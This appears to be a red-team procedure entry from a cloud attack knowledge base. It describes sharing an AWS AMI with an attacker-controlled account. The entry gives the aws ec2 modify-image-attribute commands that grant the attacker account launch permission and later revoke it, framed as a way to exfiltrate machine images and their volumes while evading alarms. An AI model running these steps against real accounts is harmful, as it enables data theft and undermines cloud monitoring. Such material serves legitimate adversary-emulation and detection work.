---
id: a3db7f5f-65a8-427a-835a-43fb2befd955
name: AWS Share AMI Image
type: procedure
verified: true
submitted: true
created_at: '2020-07-31T04:25:35.145457+00:00'
updated_at: '2023-05-25T20:06:20.389952+00:00'
platforms:
- Cloud
tags:
- '[[AWS]]'
- '[[Cloud]]'
commands:
- '[[aws ec2 remove shared AMI ID access]]'
- '[[aws ec2 share AMI ID with another user account]]'
---

# AWS Share AMI Image

**Status**: ✓ Verified

## Summary

You can share an AMI image with a different AWS account. This can be turned into an attack to bypass Alarms that watch for EC2 instances being deployed, but don't look for AMI Image creation or sharing. AWS Share AMI Image Doc 

## Description

# Description

You can share an AMI image with a different AWS account. This can be turned into an attack to bypass

Alarms that watch for EC2 instances being deployed, but don't look for AMI Image creation or sharing.

[AWS Share AMI Image Doc](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/sharingamis-explicit.html)

##  Instructions

1. Share the AMI ID with a user in the attacker AWS account. This automatically includes the EBS volume for launch

**Command** ([[aws ec2 share AMI ID with another user account]]):

```bash
aws ec2 modify-image-attribute --image-id $AWS_AMI_ID --launch-permission "Add=$IAM_USER_ID"

```

2. Remove the share permission. Do this when you want to clean up and revoke the share.

Do this after you deployed the AMI on the attacker account

**Command** ([[aws ec2 remove shared AMI ID access]]):

```bash
aws ec2 modify-image-attribute --image-id $AWS_AMI_ID --launch-permission "Remove=$IAM_USER_ID"

```

## Platforms

- Cloud

## Commands Used

- [[aws ec2 remove shared AMI ID access]]
- [[aws ec2 share AMI ID with another user account]]

## Tags

- [[AWS]]
- [[Cloud]]
